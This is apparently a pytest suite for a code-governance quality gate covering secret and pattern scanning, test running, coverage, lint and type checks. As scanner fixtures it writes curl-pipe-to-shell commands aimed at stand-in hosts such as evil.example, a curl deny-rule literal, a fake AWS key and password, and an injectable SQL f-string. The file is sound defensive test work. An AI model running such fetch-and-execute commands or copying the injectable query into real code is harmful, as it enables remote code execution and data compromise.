"""Tests for core/governance/evidence_checks.py — evidence check engine.

PR-4 evidence Quality Gate. All projects are tmp_path fixtures; heavy
subprocesses are either trivially fast real commands (python3 -c) or
monkeypatched. Never touches ~/.arkaos or this repo's own suite.
"""

import contextlib
import getpass
import json
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

from core.governance import evidence_checks
from core.governance.evidence_checks import (
    ALL_CHECKS,
    UI_SCREENSHOT_WINDOW_HOURS,
    CheckResult,
    EvidenceReport,
    _check_ui_screenshot,
    _derive_overall,
    main,
    run_evidence_checks,
)

# ─── Fixture projects ───────────────────────────────────────────────────


def _write_coverage_xml(project, line_rate: float) -> None:
    (project / "coverage.xml").write_text(
        f'<?xml version="1.0"?>\n<coverage line-rate="{line_rate}" '
        'branch-rate="0.8"></coverage>\n',
        encoding="utf-8",
    )


def _result(report: EvidenceReport, check: str) -> CheckResult:
    return next(r for r in report.results if r.check == check)


# ─── security-grep ──────────────────────────────────────────────────────


def test_security_grep_flags_fake_secret(tmp_path):
    bad = tmp_path / "settings.py"
    bad.write_text(
        'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\npassword = "hunter22"\n',
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["settings.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is False
    assert "settings.py:1" in result.summary
    assert "aws-access-key" in result.summary
    assert report.overall == "fail"


def test_security_grep_passes_clean_file(tmp_path):
    clean = tmp_path / "service.py"
    clean.write_text("def handler():\n    return 1\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["service.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is True
    assert report.overall == "pass"


def test_security_grep_sec_ok_suppresses_named_pattern_visibly(tmp_path):
    """A deny-rule literal with a correct arka:sec-ok annotation passes,
    and the suppression is reported in the summary — never silent."""
    rules = tmp_path / "spec.py"
    rules.write_text(
        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
        "  # arka:sec-ok(curl-pipe-shell): deny-rule literal\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is True
    assert "suppressed with arka:sec-ok justification" in result.summary
    assert "curl-pipe-shell" in result.summary


def test_security_grep_sec_ok_wrong_id_does_not_suppress(tmp_path):
    bad = tmp_path / "spec.py"
    bad.write_text(
        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
        "  # arka:sec-ok(aws-access-key): wrong id\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
    )
    assert _result(report, "security-grep").passed is False


def test_security_grep_sec_ok_requires_a_reason(tmp_path):
    bad = tmp_path / "spec.py"
    bad.write_text(
        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
        "  # arka:sec-ok(curl-pipe-shell):\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
    )
    assert _result(report, "security-grep").passed is False


def test_security_grep_sec_ok_only_covers_its_own_line(tmp_path):
    bad = tmp_path / "deploy.py"
    bad.write_text(
        "# arka:sec-ok(curl-pipe-shell): annotation on another line\n"
        'run("curl https://x.example/i.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["deploy.py"], checks=["security-grep"],
    )
    assert _result(report, "security-grep").passed is False


def test_security_grep_suppressions_survive_summary_truncation(tmp_path):
    """30 annotated lines: the string summary caps at 20 with an
    explicit '+10 more suppressed' marker at the END (where _tail
    keeps it), and the structured fields carry the FULL record —
    bulk annotation can never be quiet."""
    line = (
        'run("curl https://x.example/i.sh | sh")'  # arka:sec-ok(curl-pipe-shell): fixture literal
        "  # arka:sec-ok(curl-pipe-shell): fixture literal\n"
    )
    bad = tmp_path / "bulk.py"
    bad.write_text(line * 30, encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["bulk.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is True
    assert result.suppressed_count == 30
    assert len(result.suppressions) == 30
    assert result.summary.endswith("(+10 more suppressed)")
    # Whole-file mode carries line numbers on every suppression entry.
    assert result.suppressions[0].endswith("bulk.py:1 [curl-pipe-shell]")
    assert result.suppressions[29].endswith("bulk.py:30 [curl-pipe-shell]")


def test_security_grep_added_lines_mode_carries_line_numbers(tmp_path):
    """In a git repo the sweep scans only added lines — findings must
    still name the line in the NEW file, from the -U0 hunk headers."""
    clean = "def ok():\n    return 1\n"
    (tmp_path / "svc.py").write_text(clean, encoding="utf-8")
    _git(tmp_path, "init", "-b", "master")
    _git(tmp_path, "add", "svc.py")
    _git(tmp_path, "commit", "-m", "clean")
    (tmp_path / "svc.py").write_text(
        clean
        + 'run("curl https://x.io/i.sh | sh")\n'  # arka:sec-ok(curl-pipe-shell): fixture
        + 'run("curl https://y.io/j.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["svc.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    # Two ADJACENT added lines must carry consecutive numbers — pins
    # the within-hunk lineno increment, not just the hunk-header seed.
    assert "svc.py:3 [curl-pipe-shell]" in result.summary
    assert "svc.py:4 [curl-pipe-shell]" in result.summary


def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
    bad = tmp_path / "deploy.sh"
    bad.write_text("curl https://evil.example/install.sh | sh\n", encoding="utf-8")
    sql = tmp_path / "repo.py"
    sql.write_text('cursor.execute(f"SELECT * FROM t WHERE id={x}")\n', encoding="utf-8")
    report = run_evidence_checks(
        tmp_path,
        changed_files=["deploy.sh", "repo.py"],
        checks=["security-grep"],
    )
    summary = _result(report, "security-grep").summary
    assert "curl-pipe-shell" in summary
    assert "sql-fstring-interpolation" in summary


def _git(project, *args):
    import subprocess

    subprocess.run(
        ["git", *args], cwd=project, capture_output=True, check=True,
        env={"PATH": "/usr/bin:/bin:/usr/local/bin",
             "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
             "HOME": str(project)},
    )


def test_security_grep_is_diff_aware_in_a_git_repo(tmp_path):
    """Pre-existing patterns on the base branch are master's debt, not
    this change's (QG blocker, PR1 Interaction Reform): only ADDED
    lines are scanned when git can provide a diff."""
    _git(tmp_path, "init", "-b", "master")
    legacy = tmp_path / "install.sh"
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n",
        encoding="utf-8",
    )
    _git(tmp_path, "add", "install.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n"
        "echo 'new harmless line'\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["install.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is True, result.summary
    assert "added-lines" in result.command


def test_security_grep_still_flags_newly_added_patterns(tmp_path):
    _git(tmp_path, "init", "-b", "master")
    script = tmp_path / "deploy.sh"
    script.write_text("echo ok\n", encoding="utf-8")
    _git(tmp_path, "add", "deploy.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    script.write_text(
        "echo ok\ncurl https://evil.example/install.sh | sh\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["deploy.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "curl-pipe-shell" in result.summary


def test_security_grep_falls_back_to_whole_file_outside_git(tmp_path):
    # tmp_path is not a git repo → mode is whole-file (fail closed on
    # scan scope, never silently narrower than before).
    bad = tmp_path / "x.sh"
    bad.write_text("curl https://e.example/i.sh | sh\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["x.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "whole-file" in result.command


def test_security_grep_skips_without_changed_files(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["security-grep"])
    result = _result(report, "security-grep")
    assert result.ran is False
    assert result.passed is None
    assert report.overall == "insufficient-evidence"


# ─── tests check (test_command override, real trivial subprocesses) ─────


def test_tests_check_with_passing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c pass",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert result.exit_code == 0
    assert report.overall == "pass"


def test_tests_check_with_failing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c 'raise SystemExit(2)'",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is False
    assert result.exit_code == 2
    assert report.overall == "fail"


def test_pinned_test_command_that_cannot_run_fails_not_skips(tmp_path):
    """An unresolvable --test-command is a FAILURE, never a silent skip.

    The operator pinned that exact command; being unable to run it is
    evidence the suite did not run, and `ran=False` reads to an
    aggregator as "not applicable" — a fail-open in the gate itself.
    """
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command="/nonexistent/interpreter -m pytest",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is False
    assert "not found" in result.summary
    assert report.overall == "fail"


def test_pinned_test_command_expands_user_home(tmp_path, monkeypatch):
    """`~` in a pinned command resolves; shlex.split does not expand it.

    Reported by the Quality Gate 2026-08-04: `~/.arkaos/bin/arka-py`
    reached subprocess verbatim, raised FileNotFoundError, and the check
    silently skipped while reporting overall pass.

    Hermetic: HOME is redirected into tmp_path and the runner is built
    there. An earlier version derived the path from sys.executable and
    skipped whenever the interpreter lived outside HOME — which is always
    true under actions/setup-python, so the regression shipped green
    through CI while pinning nothing.
    """
    fake_home = tmp_path / "home"
    runner = fake_home / "bin" / "runner"
    runner.parent.mkdir(parents=True)
    runner.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    runner.chmod(0o755)
    monkeypatch.setenv("HOME", str(fake_home))
    monkeypatch.setenv("USERPROFILE", str(fake_home))  # expanduser on Windows

    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="~/bin/runner",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert result.command == str(runner), "the ~ must be expanded before exec"


def test_expand_argv_leaves_non_path_tilde_tokens_alone():
    """Only argv[0] and `~/`-form paths expand.

    A bare `~word` later in the command is far more likely to be a filter
    expression than a home directory — `pytest -k ~root` must not become
    `pytest -k /var/root`.
    """
    argv = evidence_checks._expand_argv(["pytest", "-k", "~root", "~/x.py"])
    assert argv[0] == "pytest"
    assert argv[2] == "~root", "a bare ~word is not a path"
    assert argv[3] == os.path.expanduser("~/x.py")


def test_expand_argv_expands_tilde_user_in_argv0():
    """argv[0] is always a program path, so the `~user` form expands there.

    Must use a real `~user` token: an earlier version asserted this
    contract while passing `~/bin/py`, so dropping ~user support left the
    whole file green.
    """
    user = getpass.getuser()
    argv = evidence_checks._expand_argv([f"~{user}/bin/py", "-c", "pass"])
    assert argv[0] == os.path.expanduser(f"~{user}/bin/py")
    assert not argv[0].startswith("~"), "the ~user form must resolve"
    assert argv[1:] == ["-c", "pass"]


def test_pinned_command_resolving_to_a_directory_fails_cleanly(tmp_path):
    """An unrunnable path must FAIL the check, never crash the gate.

    `_expand_argv` turns `~/bin` into a real directory path, and exec on a
    directory raises PermissionError — which is not FileNotFoundError. An
    uncaught raise here produces no EvidenceReport at all, which is worse
    than the silent skip this whole change set exists to remove.
    """
    a_directory = tmp_path / "notabinary"
    a_directory.mkdir()
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command=str(a_directory),
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is False
    assert report.overall == "fail"


def test_tests_check_timeout_is_clean(tmp_path, monkeypatch):
    def fake_run(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=args[0], timeout=1)

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="pytest -q",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is None
    assert result.summary == "timeout"
    assert report.overall == "insufficient-evidence"


def test_tests_prefers_project_venv_pytest(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    local = tmp_path / ".venv" / "bin"
    local.mkdir(parents=True)
    (local / "pytest").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert "tests(project-venv)" in result.command
    assert calls[0][0].endswith(".venv/bin/pytest")
    assert len(calls) == 1  # no collect-only probe for the project venv


def test_tests_foreign_pytest_skips_when_collection_fails(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        assert "--collect-only" in cmd  # only the probe may run
        return subprocess.CompletedProcess(cmd, 2, stdout="", stderr="ImportError")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert result.passed is None
    assert "pin --test-command" in result.summary
    assert report.overall == "insufficient-evidence"


def test_tests_foreign_pytest_runs_when_collection_succeeds(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert "--collect-only" in calls[0]
    assert "--collect-only" not in calls[1]


def test_tests_foreign_pytest_no_tests_collected_still_runs(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        rc = 5 if "--collect-only" in cmd else 0
        return subprocess.CompletedProcess(cmd, rc, stdout="", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True


def test_tests_probe_timeout_degrades_to_skip(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=1)

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert "pin --test-command" in result.summary


def test_tests_check_skips_when_no_runner(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert result.passed is None


# ─── pytest exit 5 = no tests collected → insufficient (issue #354) ──────


def test_tests_project_venv_exit5_is_insufficient_not_fail(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    local = tmp_path / ".venv" / "bin"
    local.mkdir(parents=True)
    (local / "pytest").write_text("#!/bin/sh\nexit 5\n", encoding="utf-8")

    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="no tests ran", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is None
    assert result.exit_code == 5
    assert "no tests collected" in result.summary
    assert "tests(project-venv)" in result.command
    assert report.overall == "insufficient-evidence"


def test_tests_npm_exit5_stays_fail_not_degraded(tmp_path, monkeypatch):
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"test": "jest"}}), encoding="utf-8",
    )

    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="", stderr="err")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.passed is False
    assert result.exit_code == 5
    assert "no tests collected" not in result.summary
    assert report.overall == "fail"


def test_tests_pytest_test_command_exit5_is_degraded(tmp_path, monkeypatch):
    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="no tests ran", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="pytest -q",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is None
    assert result.exit_code == 5
    assert "no tests collected" in result.summary
    assert report.overall == "insufficient-evidence"


def test_tests_python_m_pytest_command_exit5_is_degraded(tmp_path, monkeypatch):
    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="no tests ran", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="python -m pytest",
    )
    result = _result(report, "tests")
    assert result.passed is None
    assert "no tests collected" in result.summary
    assert report.overall == "insufficient-evidence"


def test_tests_arka_py_m_pytest_command_exit5_is_degraded(tmp_path, monkeypatch):
    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="no tests ran", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"],
        test_command="~/.arkaos/bin/arka-py -m pytest",
    )
    result = _result(report, "tests")
    assert result.passed is None
    assert "no tests collected" in result.summary
    assert report.overall == "insufficient-evidence"


def test_tests_non_pytest_test_command_exit5_stays_fail(tmp_path, monkeypatch):
    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 5, stdout="", stderr="boom")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="npm test",
    )
    result = _result(report, "tests")
    assert result.passed is False
    assert result.exit_code == 5
    assert "no tests collected" not in result.summary
    assert report.overall == "fail"


def test_degraded_pytest_does_not_mask_a_failing_lint(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(evidence_checks, "_ruff_cmd", lambda: ["ruff"])

    def fake_run(cmd, **kwargs):
        if "pytest" in " ".join(cmd):
            return subprocess.CompletedProcess(cmd, 5, stdout="no tests ran", stderr="")
        return subprocess.CompletedProcess(cmd, 1, stdout="E401 lint error", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests", "lint"], test_command="pytest -q",
    )
    tests = _result(report, "tests")
    lint = _result(report, "lint")
    assert tests.passed is None  # exit 5 degraded, not a FAIL
    assert lint.passed is False  # a real failure stands
    assert report.overall == "fail"  # degradation never masks it


# ─── coverage check (parse-only, shared helper) ─────────────────────────


def test_coverage_above_threshold_passes(tmp_path):
    _write_coverage_xml(tmp_path, 0.92)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    result = _result(report, "coverage")
    assert result.ran is True
    assert result.passed is True
    assert "92.0%" in result.summary
    assert result.details_path == str(tmp_path / "coverage.xml")


def test_coverage_below_threshold_fails(tmp_path):
    _write_coverage_xml(tmp_path, 0.55)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    assert _result(report, "coverage").passed is False
    assert report.overall == "fail"


def test_coverage_junit_fallback(tmp_path):
    (tmp_path / "junit.xml").write_text(
        '<testsuite name="pytest" errors="0" failures="1" tests="10"/>',
        encoding="utf-8",
    )
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is True
    assert result.passed is False
    assert "1 failures/errors" in result.summary


def test_coverage_skips_without_artifacts(tmp_path):
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is False
    assert result.passed is None


# ─── lint / typecheck detection ─────────────────────────────────────────


def test_lint_skips_without_tooling(tmp_path, monkeypatch):
    """No PATH binary AND no importable module (F1 polish: which alone
    no longer means 'no tooling' — the venv module counts)."""
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec", lambda _: None
    )
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is False
    assert "no lint tooling" in result.summary


def test_lint_runs_ruff_when_available(tmp_path, monkeypatch):
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="All checks passed!", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is True
    assert result.passed is True
    assert calls["cmd"][0] == "ruff"


def test_lint_scopes_to_changed_python_files(tmp_path, monkeypatch):
    """Clean changed file in a debt-ridden project must pass — master's
    debt is not this change's."""
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "legacy_debt.py").write_text("import os,sys\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["clean.py"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.passed is True
    assert calls["cmd"] == ["ruff", "check", "clean.py"]
    assert "lint(scoped: 1 file(s))" in result.command


def test_lint_scoped_fails_on_dirty_changed_file(tmp_path, monkeypatch):
    dirty = tmp_path / "dirty.py"
    dirty.write_text("import os,sys\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )

    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 1, stdout="E401", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["dirty.py"], checks=["lint"],
    )
    assert _result(report, "lint").passed is False


def test_lint_without_changed_files_stays_project_wide(tmp_path, monkeypatch):
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["lint"])
    result = _result(report, "lint")
    assert calls["cmd"] == ["ruff", "check", "."]
    assert "lint(project-wide)" in result.command


def test_lint_skips_when_changed_files_not_lintable(tmp_path, monkeypatch):
    doc = tmp_path / "README.md"
    doc.write_text("# docs\n", encoding="utf-8")
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["README.md"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.ran is False
    assert "no lintable sources" in result.summary


def test_lint_scopes_to_changed_js_files_via_local_eslint(tmp_path, monkeypatch):
    eslint = tmp_path / "node_modules" / ".bin" / "eslint"
    eslint.parent.mkdir(parents=True)
    eslint.write_text("#!/bin/sh\n", encoding="utf-8")
    changed = tmp_path / "app.vue"
    changed.write_text("<template/>\n", encoding="utf-8")
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["app.vue"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.passed is True
    assert calls["cmd"] == [str(eslint), "app.vue"]
    assert "lint(scoped: 1 file(s))" in result.command


def test_lint_changed_outside_project_dir_falls_back_project_wide(
    tmp_path, monkeypatch,
):
    """Scope containment holds (the outside file is never linted
    directly) but the gate must not go BLIND: a lintable extension in
    the diff falls back to the project-wide run (QG 2026-07-12 — the
    old skip-entirely contract let a 2 .py + 6 .js diff pass unlinted).
    """
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    outside = tmp_path.parent / f"{tmp_path.name}-outside.py"
    outside.write_text("x = 1\n", encoding="utf-8")
    captured = {}

    def fake_run(name, cmd, project_dir, timeout):
        captured["cmd"] = [str(c) for c in cmd]
        return evidence_checks.CheckResult(
            check=name, ran=True, passed=True,
            command=" ".join(str(c) for c in cmd), exit_code=0, summary="ok",
        )

    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    monkeypatch.setattr(evidence_checks, "_run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=[str(outside)], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.ran is True
    assert "project-wide" in result.command
    assert str(outside) not in " ".join(captured["cmd"]), (
        "scope containment: the outside file itself is never linted"
    )


def test_typecheck_skips_without_configuration(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is False


def test_typecheck_detects_mypy_config(tmp_path, monkeypatch):
    (tmp_path / "mypy.ini").write_text("[mypy]\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/mypy" if name == "mypy" else None,
    )
    monkeypatch.setattr(
        evidence_checks.subprocess, "run",
        lambda cmd, **kw: subprocess.CompletedProcess(cmd, 1, stdout="error: bad", stderr=""),
    )
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is True
    assert result.passed is False
    assert "mypy" in result.command


# ─── spellcheck ─────────────────────────────────────────────────────────


def test_spellcheck_skips_without_codespell(tmp_path, monkeypatch):
    """Skip only when codespell is absent BOTH from PATH and as a module.

    Clearing PATH alone is no longer enough to force the skip: an
    importable `codespell_lib` is a valid installation (venv installs
    have no PATH binary), so the module lookup must be stubbed too.
    """
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec", lambda _name: None,
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["README.md"], checks=["spellcheck"],
    )
    result = _result(report, "spellcheck")
    assert result.ran is False
    assert "codespell" in result.summary


def test_spellcheck_skips_without_md_files(tmp_path, monkeypatch):
    monkeypatch.setattr(
        evidence_checks.shutil, "which", lambda _: "/usr/bin/codespell",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["module.py"], checks=["spellcheck"],
    )
    assert _result(report, "spellcheck").ran is False


# ─── overall derivation ─────────────────────────────────────────────────


def _cr(check, ran, passed):
    return CheckResult(
        check=check, ran=ran, passed=passed, command="", exit_code=None,
        summary="",
    )


def test_overall_fail_beats_pass():
    results = [_cr("lint", True, True), _cr("tests", True, False)]
    assert _derive_overall(results) == "fail"


def test_overall_pass_requires_a_concluded_check():
    assert _derive_overall([_cr("lint", True, True)]) == "pass"


def test_overall_insufficient_when_nothing_concluded():
    results = [_cr("lint", False, None), _cr("tests", True, None)]
    assert _derive_overall(results) == "insufficient-evidence"


def test_unknown_check_is_skipped(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["nonsense"])
    result = _result(report, "nonsense")
    assert result.ran is False
    assert "unknown check" in result.summary


def test_default_runs_all_checks(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path)
    assert [r.check for r in report.results] == list(ALL_CHECKS)


# ─── CLI ────────────────────────────────────────────────────────────────


def test_cli_json_output_and_exit_codes(tmp_path, capsys):
    bad = tmp_path / "leak.py"
